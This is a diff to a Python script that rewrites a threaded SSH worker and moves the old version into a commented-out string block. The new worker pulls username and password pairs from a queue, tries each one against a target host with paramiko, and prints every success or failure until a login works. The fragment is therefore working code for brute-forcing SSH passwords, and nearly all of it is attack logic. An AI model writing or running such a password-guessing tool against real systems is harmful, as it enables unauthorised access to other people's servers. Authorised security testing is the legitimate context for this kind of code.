@@ -114,7 +114,7 @@ else:
 
 
 
-
+'''
 def ssh_worker():
     
 
@@ -125,7 +125,7 @@ def ssh_worker():
         user , password =  combo_queue.get()
         try:
             if stop_event.is_set():
-                combo_queue.all_tasks_done()
+                combo_queue.task_done()
                 return
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -141,6 +141,37 @@ def ssh_worker():
         except Exception as e:
             with result_lock:
                 print(f" Failure with {host}   :    {user}   :    {password}")
+
+        finally:
+            combo_queue.task_done()
+
+'''
+
+
+def ssh_worker():
+    while not combo_queue.empty():
+        if stop_event.is_set():
+            return  # Just exit thread safely, no task_done here yet
+
+        user, password = combo_queue.get()
+        try:
+            if stop_event.is_set():
+                combo_queue.task_done()
+                return
+
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(host, username=user, password=password, timeout=3)
+
+            with result_lock:
+                print(f"✅ SUCCESS 🎉 {user} : {password}")
+                stop_event.set()
+
+            client.close()
+
+        except Exception as e:
+            with result_lock:
+                print(f"❌ FAIL    {user} : {password}")
 
         finally:
             combo_queue.task_done()
